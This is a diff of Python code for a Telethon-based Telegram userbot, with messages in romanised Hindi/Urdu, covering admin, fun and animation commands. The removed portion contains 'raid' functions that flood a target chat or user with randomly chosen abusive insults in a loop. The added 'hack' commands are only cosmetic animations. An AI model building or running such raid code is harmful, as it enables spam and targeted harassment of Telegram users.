-        txt = f"💬 **Chat ID:** `{event.chat_id}`\n✉️ **Msg ID:** `{event.id}`"
-        if event.is_reply:
-            r = await event.get_reply_message()
-            txt += f"\n👤 **Reply User ID:** `{r.sender_id}`"
-        await event.edit(txt)
-
-    @ubot.on(events.NewMessage(pattern=r'^\.info$', outgoing=True))
-    async def info_cmd(event):
-        target = event.sender_id
-        if event.is_reply:
-            r = await event.get_reply_message()
-            target = r.sender_id
-        try:
-            u = await ubot.get_entity(target)
-            uname = f"\n• **Username:** `@{u.username}`" if getattr(u, 'username', None) else ""
-            await event.edit(
-                f"👤 **User Details**\n"
-                f"• **ID:** `{u.id}`\n"
-                f"• **Naam:** `{getattr(u, 'first_name', '')}`{uname}"
-            )
-        except Exception as e:
-            await event.edit(f"❌ **Jankari nahi mil saki:** `{e}`")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.calc\b', outgoing=True))
-    async def calc_cmd(event):
-        parts = event.raw_text.split(maxsplit=1)
-        if len(parts) < 2 or not re.fullmatch(r'[0-9+\-*/().%\s]+', parts[1]):
-            await event.edit("ℹ️ **Istemaal:** `.calc 25*4`")
-            return
-        try:
-            ans = eval(parts[1], {"__builtins__": None}, {})
-            await event.edit(f"🧮 `{parts[1]}` = **`{ans}`**")
-        except Exception:
-            await event.edit("❌ **Expression sahi nahi hai.**")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.type\b', outgoing=True))
-    async def type_cmd(event):
-        parts = event.raw_text.split(maxsplit=1)
-        if len(parts) < 2:
-            await event.edit("ℹ️ **Istemaal:** `.type hello`")
-            return
-        txt = parts[1]
-        cur = ""
-        for ch in txt:
-            cur += ch
-            await event.edit(f"`{cur}▌`")
-            await asyncio.sleep(0.08)
-        await event.edit(txt)
-
-    @ubot.on(events.NewMessage(pattern=r'^\.mock\b', outgoing=True))
-    async def mock_cmd(event):
-        parts = event.raw_text.split(maxsplit=1)
-        src = parts[1] if len(parts) > 1 else ""
-        if not src and event.is_reply:
-            r = await event.get_reply_message()
-            src = r.raw_text or ""
-        if not src:
-            await event.edit("ℹ️ **Text dein ya kisi message par reply karein.**")
-            return
-        out = "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(src))
-        await event.edit(out)
-
-    @ubot.on(events.NewMessage(pattern=r'^\.save$', outgoing=True))
-    async def save_cmd(event):
-        if not event.is_reply:
-            await event.edit("ℹ️ **Kisi message ya media par reply karke `.save` likhein.**")
-            return
-        r = await event.get_reply_message()
-        try:
-            await ubot.send_message("me", r)
-            await event.edit("💾 **Saved Messages mein save ho gaya hai.**")
-        except Exception as e:
-            await event.edit(f"❌ **Save nahi ho saka:** `{e}`")
-
-    # 12. STYLED RAIDS (.araid / .saraid / .oaraid / .faraid / .earaid) & STOP COMMANDS
-    async def raid_worker(target_chat, command, reply_to, count):
-        iteration = 0
-        while target_chat in active_raids:
-            if count is not None and iteration >= count:
-                break
-
-            if command == 'earaid':
-                base_text = random.choice(EARAID_LIST)
-            else:
-                gaali = random.choice(GAALIS)
-                if command == 'araid':
-                    base_text = format_araid(gaali)
-                elif command == 'saraid':
-                    base_text = format_saraid(gaali)
-                elif command == 'oaraid':
-                    base_text = format_oaraid(gaali)
-                elif command == 'faraid':
-                    base_text = format_faraid(gaali)
-                else:
-                    base_text = gaali
-
+    # 9. HACK & ANIMATION (50s HACKS INCLUDED)
+    async def _run_50s_hack(event, title, stages):
+        msg = await event.edit(f"⚡ **{title} INITIATED (50s)...**")
+        total = 50
+        step_dur = 2.0
+        steps_count = int(total / step_dur)
+        for i in range(steps_count):
+            pct = min(100, int(((i + 1) / steps_count) * 100))
+            bar_len = 12
+            filled = int((pct / 100) * bar_len)
+            bar = "█" * filled + "░" * (bar_len - filled)
+            stage_line = stages[i % len(stages)]
             try:
-                if reply_to:
-                    await ubot.send_message(target_chat, base_text, reply_to=reply_to)
-                else:
-                    await ubot.send_message(target_chat, base_text)
+                await msg.edit(
+                    f"┏━「 💀 **{title}** 」━┓\n"
+                    f"┃ • **STATUS:** `{stage_line}`\n"
+                    f"┃ • **PROGRESS:** `[{bar}] {pct}%`\n"
+                    f"┃ • **TIME:** `{(i+1)*2}s / 50s`\n"
+                    f"┗━━━━━━━━━━━━━━━━━━━━━━━━━┛"
+                )
             except FloodWaitError as f:
                 await asyncio.sleep(f.seconds + 0.5)
             except Exception:
-                await asyncio.sleep(0.5)
-
-            iteration += 1
-            await asyncio.sleep(1.1 / 8)
-
-        active_raids.discard(target_chat)
-        active_raid_tasks.pop(target_chat, None)
-
-    @ubot.on(events.NewMessage(pattern=r'^\.(araid|saraid|oaraid|faraid|earaid)', outgoing=True))
-    async def raid_handler(event):
-        command = event.pattern_match.group(1)
-        args = event.raw_text.split()
-
-        target_chat = event.chat_id
-        reply_to = event.reply_to_msg_id
-        count = None
-        target_arg = None
-
-        for arg in args[1:]:
-            if arg.isdigit():
-                count = int(arg)
-            else:
-                target_arg = arg
-
-        if target_arg:
-            if "t.me/" in target_arg:
-                if "/c/" in target_arg:
-                    match = re.search(r'/c/(\d+)/(\d+)', target_arg)
-                    if match:
-                        target_chat = int("-100" + match.group(1))
-                        reply_to = int(match.group(2))
-                else:
-                    match = re.search(r't\.me/([^/]+)(?:/(\d+))?', target_arg)
-                    if match:
-                        username = match.group(1)
-                        msg_id = match.group(2)
-                        try:
-                            entity = await ubot.get_entity(username)
-                            target_chat = entity.id
-                            if msg_id:
-                                reply_to = int(msg_id)
-                        except Exception:
-                            pass
-            elif target_arg.startswith("@"):
-                try:
-                    entity = await ubot.get_entity(target_arg)
-                    target_chat = entity.id
-                except Exception:
-                    pass
-
-        if target_chat in active_raid_tasks:
-            active_raid_tasks[target_chat].cancel()
-
-        active_raids.add(target_chat)
-        try:
-            await event.delete()
-        except Exception:
-            pass
-
-        task = asyncio.create_task(raid_worker(target_chat, command, reply_to, count))
-        active_raid_tasks[target_chat] = task
-
-    @ubot.on(events.NewMessage(pattern=r'^\.stop$', outgoing=True))
-    async def stop_raid(event):
-        chat_id = event.chat_id
-        if chat_id in active_raids:
-            active_raids.remove(chat_id)
-            if chat_id in active_raid_tasks:
-                active_raid_tasks[chat_id].cancel()
-                del active_raid_tasks[chat_id]
-            try:
-                await event.edit("🛑 **Is chat mein raid rok di gayi hai.**")
-            except Exception:
                 pass
-        else:
+            await asyncio.sleep(step_dur)
+        await msg.edit(f"✅ **{title} COMPLETE (50s) — BY {OWNER_NAME}!**")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.(netghost|rootkit|cryptohack|zeroday)$', outgoing=True))
+    async def hack_50s_handler(event):
+        cmd = event.pattern_match.group(1).upper()
+        pools = {
+            "NETGHOST": ["GHOSTING SOCKET", "SPOOFING NODE", "BYPASSING RELAY", "MASKING TRACE"],
+            "ROOTKIT": ["MOUNTING KERNEL HOOK", "ELEVATING PRIVILEGES", "HIDING PROCESS", "INJECTING MODULE"],
+            "CRYPTOHACK": ["PROBING CIPHER", "TESTING KEYSPACE", "DECRYPTING BLOCKS", "VERIFYING HASH"],
+            "ZERODAY": ["SCANNING EXPLOIT", "CRAFTING PAYLOAD", "TRIGGERING VECTOR", "GAINING SHELL"],
+        }
+        await _run_50s_hack(event, cmd, pools[cmd])
+
+    @ubot.on(events.NewMessage(pattern=r'^\.(hack|matrix|scan|loading|boom|fbi|fuck)$', outgoing=True))
+    async def quick_anim_handler(event):
+        cmd = event.pattern_match.group(1)
+        frames_map = {
+            "hack": ["💻 `Connecting to target...`", "🔓 `Bypassing firewall... 45%`", "📂 `Dumping packets... 88%`", "✅ `Access simulated — KASHYAP USERBOT`"],
+            "matrix": ["🟩 `01010110 10010110`", "🟩 `11001010 00110101`", "🟩 `SYSTEM MATRIX SYNCED`"],
+            "scan": ["🔍 `Scanning open ports...`", "📡 `Checking latency & routes...`", "✅ `Scan complete.`"],
+            "loading": ["⏳ `Loading modules... [██░░░░░░░░] 20%`", "⏳ `Loading modules... [██████░░░░] 60%`", "✅ `Ready!`"],
+            "boom": ["💣 `Fuse lit... 3`", "💥 `Fuse lit... 2`", "🔥 `Fuse lit... 1`", "💥💥 **BOOOM!** 💥💥"],
+            "fbi": ["🚨 `FBI OPEN UP` 🚨", "🚔 `PERIMETER LOCKED` 🚔", "✅ `TARGET SECURED`"],
+            "fuck": ["🖕 `🖕🖕🖕`", "🔥 `🖕🖕🖕🖕🖕`", "⚡ `DONE`"],
+        }
+        msg = await event.edit(frames_map[cmd][0])
+        for fr in frames_map[cmd][1:]:
+            await asyncio.sleep(0.7)
             try:
-                await event.edit("ℹ️ **Is chat mein koi raid nahi chal rahi hai.**")
+                await msg.edit(fr)
             except Exception:
                 pass
 
-    @ubot.on(events.NewMessage(pattern=r'^\.stopall$', outgoing=True))
-    async def stop_all_raids(event):
-        active_raids.clear()
-        for chat_id, task in active_raid_tasks.items():
-            task.cancel()
-        active_raid_tasks.clear()
-        for item in [x for x in rraid_targets if x[0] == event.chat_id]:
-            rraid_targets.discard(item)
-        try:
-            await event.edit("🛑 **Sabhi active raids rok di gayi hain.**")
-        except Exception:
-            pass
-
-    # 13. GROUP/ADMIN, TEXT/FUN, UTILITY & EXTRA RAID MODES
-    async def _extract_target_user(event):
-        if event.is_reply:
-            r = await event.get_reply_message()
-            if r and r.sender_id:
-                return r.sender_id
+    @ubot.on(events.NewMessage(pattern=r'^\.(bruteforce|packetflood|sysbreach|pulse|countanim|glitch)\b', outgoing=True))
+    async def iter_anim_handler(event):
+        cmd = event.pattern_match.group(1)
         parts = event.raw_text.split(maxsplit=1)
-        if len(parts) > 1:
-            target = parts[1].strip().split()[0]
-            if target.isdigit():
-                return int(target)
+        n = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10
+        n = max(1, min(n, 50))
+        msg = await event.edit(f"⚡ `{cmd.upper()}` starting ({n} steps)...")
+        for i in range(1, n + 1):
+            if cmd == "glitch":
+                txt = f"⚡ `GLITCH_{i}x#$_%@{random.randint(10,99)}`"
+            elif cmd == "pulse":
+                txt = f"💓 `PULSE [{i}/{n}]` {'♥' * ((i % 5) + 1)}"
+            elif cmd == "countanim":
+                txt = f"🔢 **COUNT:** `{i}` / `{n}`"
+            else:
+                txt = f"⚙️ `{cmd.upper()}` step `{i}/{n}`..."
             try:
-                ent = await ubot.get_entity(target)
-                return ent.id
+                await msg.edit(txt)
+            except FloodWaitError as f:
+                await asyncio.sleep(f.seconds + 0.5)
+            except Exception:
+                pass
+            await asyncio.sleep(0.35)
+        await msg.edit(f"✅ `{cmd.upper()}` finished ({n} steps).")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.type\b', outgoing=True))
+    async def type_anim_handler(event):
+        parts = event.raw_text.split(maxsplit=1)
+        if len(parts) < 2 or not parts[1].strip():
+            await event.edit("ℹ️ **Istemaal:** `.type [text]`")
+            return
+        full = parts[1].strip()
+        step = max(1, len(full) // 8)
+        msg = await event.edit("▌")
+        for idx in range(step, len(full) + 1, step):
+            try:
+                await msg.edit(f"{full[:idx]}▌")
+            except Exception:
+                pass
+            await asyncio.sleep(0.25)
+        await msg.edit(full)
+
+    # 10. GROUP, ADMIN & AUTOPIN
+    async def _target_from_reply_or_arg(event):
+        if event.is_reply:
+            rep = await event.get_reply_message()
+            return rep.sender_id
+        parts = event.raw_text.split(maxsplit=1)
+        if len(parts) > 1 and parts[1].strip():
+            try:
+                ent = await ubot.get_entity(parts[1].strip())
+                return getattr(ent, "id", None)
             except Exception:
                 return None
         return None
 
     @ubot.on(events.NewMessage(pattern=r'^\.ban\b', outgoing=True))
     async def ban_cmd(event):
-        if not event.is_group and not event.is_channel:
-            await event.edit("ℹ️ **Yeh command group ya channel mein chalti hai.**")
-            return
-        uid = await _extract_target_user(event)
+        uid = await _target_from_reply_or_arg(event)
         if not uid:
-            await event.edit("ℹ️ **Kisi message par reply karein ya username/ID dein.**")
+            await event.edit("ℹ️ **Reply ya user/ID ke saath `.ban` likhein.**")
             return
         try:
             await ubot.edit_permissions(event.chat_id, uid, view_messages=False)
-            await event.edit(f"🔨 **User ban kar diya gaya:** `{uid}`")
+            await event.edit(f"🔨 **Banned `{uid}`.**")
         except Exception as e:
-            await event.edit(f"❌ **Ban nahi ho saka:** `{e}`")
+            await event.edit(f"❌ **Ban fail:** `{e}`")
 
     @ubot.on(events.NewMessage(pattern=r'^\.unban\b', outgoing=True))
     async def unban_cmd(event):
-        if not event.is_group and not event.is_channel:
-            await event.edit("ℹ️ **Yeh command group ya channel mein chalti hai.**")
-            return
-        uid = await _extract_target_user(event)
+        uid = await _target_from_reply_or_arg(event)
         if not uid:
-            await event.edit("ℹ️ **Kisi message par reply karein ya username/ID dein.**")
+            await event.edit("ℹ️ **Reply ya user/ID ke saath `.unban` likhein.**")
             return
         try:
             await ubot.edit_permissions(event.chat_id, uid, view_messages=True)
-            await event.edit(f"✅ **User unban kar diya gaya:** `{uid}`")
+            await event.edit(f"✅ **Unbanned `{uid}`.**")
         except Exception as e:
-            await event.edit(f"❌ **Unban nahi ho saka:** `{e}`")
+            await event.edit(f"❌ **Unban fail:** `{e}`")
 
     @ubot.on(events.NewMessage(pattern=r'^\.kick\b', outgoing=True))
     async def kick_cmd(event):
-        if not event.is_group and not event.is_channel:
-            await event.edit("ℹ️ **Yeh command group ya channel mein chalti hai.**")
-            return
-        uid = await _extract_target_user(event)
+        uid = await _target_from_reply_or_arg(event)
         if not uid:
-            await event.edit("ℹ️ **Kisi message par reply karein ya username/ID dein.**")
+            await event.edit("ℹ️ **Reply ya user/ID ke saath `.kick` likhein.**")
             return
         try:
             await ubot.kick_participant(event.chat_id, uid)
-            await event.edit(f"👢 **User kick kar diya gaya:** `{uid}`")
+            await event.edit(f"👢 **Kicked `{uid}`.**")
         except Exception as e:
-            await event.edit(f"❌ **Kick nahi ho saka:** `{e}`")
+            await event.edit(f"❌ **Kick fail:** `{e}`")
 
     @ubot.on(events.NewMessage(pattern=r'^\.mute\b', outgoing=True))
     async def mute_cmd(event):
-        if not event.is_group and not event.is_channel:
-            await event.edit("ℹ️ **Yeh command group ya channel mein chalti hai.**")
-            return
-        uid = await _extract_target_user(event)
+        uid = await _target_from_reply_or_arg(event)
         if not uid:
-            await event.edit("ℹ️ **Kisi message par reply karein ya username/ID dein.**")
+            await event.edit("ℹ️ **Reply ya user/ID ke saath `.mute` likhein.**")
             return
         try:
             await ubot.edit_permissions(event.chat_id, uid, send_messages=False)
-            await event.edit(f"🔇 **User mute kar diya gaya:** `{uid}`")
+            await event.edit(f"🔇 **Muted `{uid}`.**")
         except Exception as e:
-            await event.edit(f"❌ **Mute nahi ho saka:** `{e}`")
+            await event.edit(f"❌ **Mute fail:** `{e}`")
 
     @ubot.on(events.NewMessage(pattern=r'^\.unmute\b', outgoing=True))
     async def unmute_cmd(event):
-        if not event.is_group and not event.is_channel:
-            await event.edit("ℹ️ **Yeh command group ya channel mein chalti hai.**")
-            return
-        uid = await _extract_target_user(event)
+        uid = await _target_from_reply_or_arg(event)
         if not uid:
-            await event.edit("ℹ️ **Kisi message par reply karein ya username/ID dein.**")
+            await event.edit("ℹ️ **Reply ya user/ID ke saath `.unmute` likhein.**")
             return
         try:
             await ubot.edit_permissions(event.chat_id, uid, send_messages=True)
-            await event.edit(f"🔊 **User unmute kar diya gaya:** `{uid}`")
+            await event.edit(f"🔊 **Unmuted `{uid}`.**")
         except Exception as e:
-            await event.edit(f"❌ **Unmute nahi ho saka:** `{e}`")
+            await event.edit(f"❌ **Unmute fail:** `{e}`")
 
     @ubot.on(events.NewMessage(pattern=r'^\.pin$', outgoing=True))
     async def pin_cmd(event):
         if not event.is_reply:
-            await event.edit("ℹ️ **Pin karne ke liye kisi message par reply karein.**")
+            await event.edit("ℹ️ **Kisi message par reply karke `.pin` likhein.**")
             return
-        r = await event.get_reply_message()
+        rep = await event.get_reply_message()
         try:
-            await ubot.pin_message(event.chat_id, r.id, notify=False)
-            await event.edit("📌 **Message pin kar diya gaya hai.**")
+            await ubot.pin_message(event.chat_id, rep.id, notify=False)
+            await event.edit("📌 **Message pin kar diya gaya.**")
         except Exception as e:
-            await event.edit(f"❌ **Pin nahi ho saka:** `{e}`")
+            await event.edit(f"❌ **Pin fail:** `{e}`")
 
     @ubot.on(events.NewMessage(pattern=r'^\.unpin$', outgoing=True))
     async def unpin_cmd(event):
         try:
-            msg_id = None
-            if event.is_reply:
-                r = await event.get_reply_message()
-                msg_id = r.id
-            await ubot.unpin_message(event.chat_id, msg_id)
-            await event.edit("📍 **Message unpin kar diya gaya hai.**")
+            rep = await event.get_reply_message() if event.is_reply else None
+            await ubot.unpin_message(event.chat_id, rep.id if rep else None)
+            await event.edit("📍 **Unpin ho gaya.**")
         except Exception as e:
-            await event.edit(f"❌ **Unpin nahi ho saka:** `{e}`")
+            await event.edit(f"❌ **Unpin fail:** `{e}`")
 
     @ubot.on(events.NewMessage(pattern=r'^\.del$', outgoing=True))
     async def del_cmd(event):
         if not event.is_reply:
-            await event.edit("ℹ️ **Delete karne ke liye kisi message par reply karein.**")
+            await event.edit("ℹ️ **Kisi message par reply karke `.del` likhein.**")
             return
-        r = await event.get_reply_message()
+        rep = await event.get_reply_message()
         try:
-            await r.delete()
-            await event.delete()
-        except Exception as e:
-            await event.edit(f"❌ **Delete nahi ho saka:** `{e}`")
+            await ubot.delete_messages(event.chat_id, [event.id, rep.id])
+        except Exception:
+            try:
+                await event.delete()
+            except Exception:
+                pass
 
     @ubot.on(events.NewMessage(pattern=r'^\.invite$', outgoing=True))
     async def invite_cmd(event):
-        if not event.is_group and not event.is_channel:
-            await event.edit("ℹ️ **Yeh command group ya channel mein chalti hai.**")
-            return
         try:
-            invite = await ubot(ExportChatInviteRequest(event.chat_id))
-            await event.edit(f"🔗 **Invite Link:** {invite.link}")
+            res = await ubot(ExportChatInviteRequest(peer=event.chat_id))
+            await event.edit(f"🔗 **Invite Link:** {res.link}")
         except Exception as e:
-            await event.edit(f"❌ **Link nahi ban saka:** `{e}`")
+            await event.edit(f"❌ **Invite link nahi ban paaya:** `{e}`")
 
-    @ubot.on(events.NewMessage(pattern=r'^\.reverse\b', outgoing=True))
-    async def reverse_cmd(event):
+    @ubot.on(events.NewMessage(pattern=r'^\.purge\b', outgoing=True))
+    async def purge_cmd(event):
         parts = event.raw_text.split(maxsplit=1)
-        txt = parts[1] if len(parts) > 1 else ((await event.get_reply_message()).raw_text if event.is_reply else "")
-        if not txt:
-            await event.edit("ℹ️ **Istemaal:** `.reverse [text]`")
-            return
-        await event.edit(txt[::-1])
-
-    @ubot.on(events.NewMessage(pattern=r'^\.clap\b', outgoing=True))
-    async def clap_cmd(event):
-        parts = event.raw_text.split(maxsplit=1)
-        txt = parts[1] if len(parts) > 1 else ((await event.get_reply_message()).raw_text if event.is_reply else "")
-        if not txt:
-            await event.edit("ℹ️ **Istemaal:** `.clap [text]`")
-            return
-        await event.edit(" 👏 ".join(txt.split()))
-
-    @ubot.on(events.NewMessage(pattern=r'^\.vapor\b', outgoing=True))
-    async def vapor_cmd(event):
-        parts = event.raw_text.split(maxsplit=1)
-        txt = parts[1] if len(parts) > 1 else ((await event.get_reply_message()).raw_text if event.is_reply else "")
-        if not txt:
-            await event.edit("ℹ️ **Istemaal:** `.vapor [text]`")
-            return
-        wide = "".join(chr(ord(c) + 0xFEE0) if 33 <= ord(c) <= 126 else (" " if c == " " else c) for c in txt)
-        await event.edit(wide)
-
-    @ubot.on(events.NewMessage(pattern=r'^\.ship\b', outgoing=True))
-    async def ship_cmd(event):
-        pct = random.randint(1, 100)
-        bar = "❤️" * max(1, pct // 20) + "🤍" * (5 - max(1, pct // 20))
-        await event.edit(f"💘 **Compatibility:** `{pct}%`\n{bar}")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.slap$', outgoing=True))
-    async def slap_cmd(event):
-        msg = "👋💥 *Ek zor ka slap laga!* 😵‍💫"
+        limit = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 20
+        limit = max(1, min(limit, 100))
+        msg_ids = [event.id]
         if event.is_reply:
-            r = await event.get_reply_message()
-            await r.reply(msg)
-            try:
-                await event.delete()
-            except Exception:
-                pass
+            rep = await event.get_reply_message()
+            async for m in ubot.iter_messages(event.chat_id, min_id=rep.id - 1, max_id=event.id):
+                msg_ids.append(m.id)
         else:
-            await event.edit(msg)
-
-    @ubot.on(events.NewMessage(pattern=r'^\.hug$', outgoing=True))
-    async def hug_cmd(event):
-        msg = "🤗🫶 *Ek warm hug!* ✨"
-        if event.is_reply:
-            r = await event.get_reply_message()
-            await r.reply(msg)
-            try:
-                await event.delete()
-            except Exception:
-                pass
-        else:
-            await event.edit(msg)
-
-    @ubot.on(events.NewMessage(pattern=r'^\.8ball\b', outgoing=True))
-    async def eightball_cmd(event):
-        answers = [
-            "Haan, bilkul pakka hai! ✨",
-            "Abhi kuch kehna mushkil hai 🔮",
-            "Bilkul nahi ❌",
-            "Aage chal kar mauka milega 🌟",
-            "100% chances hain 🔥"
-        ]
-        await event.edit(f"🎱 **8Ball:** {random.choice(answers)}")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.fact$', outgoing=True))
-    async def fact_cmd(event):
-        facts = [
-            "🐙 Octopus ke paas teen dil aur neela khoon hota hai.",
-            "🍯 Shahad (honey) kabhi kharab nahi hota.",
-            "⚡ Bijli ki garmi suraj ki satah se bhi zyada hoti hai.",
-            "🌙 Chand har saal dharti se lagbhag 3.8 cm door ja raha hai."
-        ]
-        await event.edit(f"💡 **Fact:** {random.choice(facts)}")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.shayari$', outgoing=True))
-    async def shayari_cmd(event):
-        lines = [
-            "✨ *Apni pehchan khud banani padti hai, naam se sirf shor hota hai.* 🔥",
-            "🌙 *Khamoshi ko kamzori mat samajhna, toofan aksar shant aata hai.* ⚡",
-            "👑 *Bheed mein chalna aasaan hai, apna raasta khud banana alag baat hai.* 💫"
-        ]
-        await event.edit(random.choice(lines))
-
-    @ubot.on(events.NewMessage(pattern=r'^\.time$', outgoing=True))
-    async def time_cmd(event):
-        now = datetime.now().strftime("%I:%M:%S %p")
-        await event.edit(f"🕒 **Current Time:** `{now}`")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.date$', outgoing=True))
-    async def date_cmd(event):
-        today = datetime.now().strftime("%A, %d %B %Y")
-        await event.edit(f"📅 **Today's Date:** `{today}`")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.whois\b', outgoing=True))
-    async def whois_cmd(event):
-        uid = await _extract_target_user(event) or event.sender_id
+            async for m in ubot.iter_messages(event.chat_id, limit=limit):
+                msg_ids.append(m.id)
         try:
-            u = await ubot.get_entity(uid)
-            uname = f"@{u.username}" if getattr(u, "username", None) else "None"
-            dc = getattr(u, "photo", None)
-            dc_id = getattr(dc, "dc_id", "N/A") if dc else "N/A"
-            await event.edit(
-                f"🪪 **Whois Profile**\n"
-                f"• **ID:** `{u.id}`\n"
-                f"• **First Name:** `{getattr(u, 'first_name', '')}`\n"
-                f"• **Username:** `{uname}`\n"
-                f"• **DC:** `{dc_id}`"
-            )
+            await ubot.delete_messages(event.chat_id, list(set(msg_ids)))
+            done = await ubot.send_message(event.chat_id, f"🧹 **Purged `{len(set(msg_ids))}` messages.**")
+            await asyncio.sleep(2)
+            await done.delete()
         except Exception as e:
-            await event.edit(f"❌ **Whois nahi mil saka:** `{e}`")
+            await event.edit(f"❌ **Purge fail:** `{e}`")
 
-    @ubot.on(events.NewMessage(pattern=r'^\.chatinfo$', outgoing=True))
-    async def chatinfo_cmd(event):
-        try:
-            chat = await event.get_chat()
-            title = getattr(chat, "title", None) or getattr(chat, "first_name", "Private Chat")
-            await event.edit(
-                f"💬 **Chat Info**\n"
-                f"• **Title:** `{title}`\n"
-                f"• **Chat ID:** `{event.chat_id}`\n"
-                f"• **Type:** `{'Group/Channel' if (event.is_group or event.is_channel) else 'Private'}`"
-            )
-        except Exception as e:
-            await event.edit(f"❌ **Chat info nahi mil saki:** `{e}`")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.stats$', outgoing=True))
-    async def stats_cmd(event):
-        await event.edit(
-            f"📊 **{BOT_BRAND} Stats**\n"
-            f"• **Hosted Sessions:** `{len(user_sessions)}`\n"
-            f"• **Active Raids:** `{len(active_raids)}`\n"
-            f"• **RRAID Targets:** `{len(rraid_targets)}`\n"
-            f"• **AutoPin Chats:** `{len(autopin_chats)}`\n"
-            f"• **DM AutoPin Targets:** `{len(dm_autopin_targets)}`\n"
-            f"• **Uptime:** `{format_uptime()}`"
-        )
-
-    @ubot.on(events.NewMessage(pattern=r'^\.help$', outgoing=True))
-    async def ubot_help_cmd(event):
-        await event.edit(STATIC_COMMANDS_TEXT)
-
-    @ubot.on(events.NewMessage(pattern=r'^\.restart$', outgoing=True))
-    async def restart_cmd(event):
-        await event.edit("🔄 **Session restart ho raha hai...**")
-        asyncio.create_task(start_userbot_session(session_string, owner_id))
-        await asyncio.sleep(0.5)
-        raise events.StopPropagation
-
-    @ubot.on(events.NewMessage(pattern=r'^\.(badaid|saraid2|ultraid)\b', outgoing=True))
-    async def extra_28_raids_cmd(event):
-        cmd = event.pattern_match.group(1)
-        parts = event.raw_text.split()
-        count = max(1, min(int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 15, 100))
-
-        if event.chat_id in active_raid_tasks:
-            active_raid_tasks[event.chat_id].cancel()
-        active_raids.add(event.chat_id)
-        try:
-            await event.delete()
-        except Exception:
-            pass
-
-        async def _worker():
-            try:
-                for _ in range(count):
-                    if event.chat_id not in active_raids:
-                        break
-                    base = random.choice(GAALIS)
-                    if cmd == "badaid":
-                        msg = f"🔥 {base.upper()} 🔥"
-                    elif cmd == "saraid2":
-                        msg = format_saraid(base)
-                    else:
-                        msg = f"⚡ {format_araid(base)} 💀"
-                    try:
-                        await ubot.send_message(event.chat_id, msg, reply_to=event.reply_to_msg_id)
-                    except FloodWaitError as f:
-                        await asyncio.sleep(f.seconds + 0.5)
-                    except Exception:
-                        break
-                    await asyncio.sleep(0.2)
-            finally:
-                active_raids.discard(event.chat_id)
-                active_raid_tasks.pop(event.chat_id, None)
-
-        active_raid_tasks[event.chat_id] = asyncio.create_task(_worker())
-
-    # 14. AUTOPIN + DMAUTOPIN + TAGALL / ADMINS / BOTS / TEXT / COIN / RATE / CLEAR
-    async def _resolve_chat_target(raw_arg, fallback_id):
-        if not raw_arg:
-            return fallback_id
-        token = raw_arg.strip()
-        if token.lstrip("-").isdigit():
-            return int(token)
-        try:
-            ent = await ubot.get_entity(token)
-            return ent.id
-        except Exception:
-            return None
-
-    @ubot.on(events.NewMessage(pattern=r'^\.autopin\b', outgoing=True))
+    @ubot.on(events.NewMessage(pattern=r'^\.autopin\s+(on|off)(?:\s+(-?\d+))?$', outgoing=True))
     async def autopin_cmd(event):
-        parts = event.raw_text.split()
-        if len(parts) < 2 or parts[1].lower() not in ("on", "off"):
-            await event.edit("ℹ️ **Istemaal:** `.autopin on <id>` ya `.autopin off <id>`")
-            return
-
-        mode = parts[1].lower()
-        target_arg = parts[2] if len(parts) > 2 else None
-        target_chat = await _resolve_chat_target(target_arg, event.chat_id)
-        if not target_chat:
-            await event.edit("❌ **Chat ID ya target sahi nahi hai.**")
-            return
-
-        if mode == "on":
-            autopin_chats.add(target_chat)
-            await event.edit(f"📌 **AutoPin ON** ho gaya hai chat `{target_chat}` ke liye.")
+        state = event.pattern_match.group(1).lower()
+        cid_arg = event.pattern_match.group(2)
+        target = int(cid_arg) if cid_arg else event.chat_id
+        if state == "on":
+            autopin_chats.add(target)
+            await event.edit(f"📌 **AutoPin ON (`{target}`).**")
         else:
-            autopin_chats.discard(target_chat)
-            await event.edit(f"📍 **AutoPin OFF** ho gaya hai chat `{target_chat}` ke liye.")
+            autopin_chats.discard(target)
+            await event.edit(f"📍 **AutoPin OFF (`{target}`).**")
 
-    @ubot.on(events.NewMessage(incoming=True))
-    async def autopin_incoming_handler(event):
-        if event.is_private:
-            if event.sender_id and event.sender_id in dm_autopin_targets:
-                try:
-                    await ubot.pin_message(event.sender_id, event.id, notify=False)
-                except Exception:
-                    pass
+    @ubot.on(events.NewMessage(pattern=r'^\.dmautopin\s+(on|off)(?:\s+(\d+))?$', outgoing=True))
+    async def dmautopin_cmd(event):
+        state = event.pattern_match.group(1).lower()
+        tid_arg = event.pattern_match.group(2)
+        target = int(tid_arg) if tid_arg else (event.chat_id if event.is_private else None)
+        if not target:
+            await event.edit("ℹ️ **DM mein chalayein ya user ID dein.**")
             return
+        if state == "on":
+            dm_autopin_targets.add(target)
+            await event.edit(f"📌 **DM AutoPin ON (`{target}`).**")
+        else:
+            dm_autopin_targets.discard(target)
+            await event.edit(f"📍 **DM AutoPin OFF (`{target}`).**")
 
-        if event.chat_id in autopin_chats:
+    @ubot.on(events.NewMessage(outgoing=True))
+    async def autopin_watcher(event):
+        raw = (event.raw_text or "").strip()
+        if raw.startswith(".") or raw.startswith("/"):
+            return
+        if event.chat_id in autopin_chats or (event.is_private and event.chat_id in dm_autopin_targets):
             try:
                 await ubot.pin_message(event.chat_id, event.id, notify=False)
             except Exception:
                 pass
 
-    @ubot.on(events.NewMessage(pattern=r'^\.dmautopin\b', outgoing=True))
-    async def dmautopin_cmd(event):
-        parts = event.raw_text.split()
-        if len(parts) < 2 or parts[1].lower() not in ("on", "off"):
-            await event.edit("ℹ️ **Istemaal:** `.dmautopin on <t>` ya `.dmautopin off <t>`")
-            return
-
-        mode = parts[1].lower()
-        target_arg = parts[2] if len(parts) > 2 else (str(event.chat_id) if event.is_private else None)
-        if not target_arg and event.is_reply:
-            r = await event.get_reply_message()
-            if r and r.sender_id:
-                target_arg = str(r.sender_id)
-
-        target_uid = await _resolve_chat_target(target_arg, None)
-        if not target_uid:
